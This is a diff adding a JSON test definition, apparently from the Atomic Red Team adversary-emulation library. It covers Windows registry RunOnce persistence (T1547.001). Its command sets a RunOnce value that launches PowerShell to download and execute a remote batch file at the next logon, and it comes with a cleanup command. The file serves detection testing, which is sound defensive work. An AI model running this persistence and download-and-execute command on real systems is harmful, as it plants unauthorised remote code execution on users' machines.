@@ -1,0 +1,37 @@
+{
+    "name": "PowerShell Registry RunOnce",
+    "description": "RunOnce Key Persistence via PowerShell Upon successful execution, a new entry will be added to the runonce item in the registry. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\")\"'\n",
+        "cleanup_command": "Remove-ItemProperty -Path #{reg_key_path} -Name \"NextRun\" -Force -ErrorAction Ignore\n",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1547.001",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation"
+    ],
+    "technique": "Registry Run Keys / Startup Folder",
+    "source": "ART",
+    "uuid": "eb44f842-0457-4ddc-9b92-c4caa144ac42",
+    "arguments": {
+        "thing_to_execute": {
+            "description": "Thing to Run",
+            "type": "path",
+            "default": "powershell.exe"
+        },
+        "reg_key_path": {
+            "description": "Path to registry key to update",
+            "type": "path",
+            "default": "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
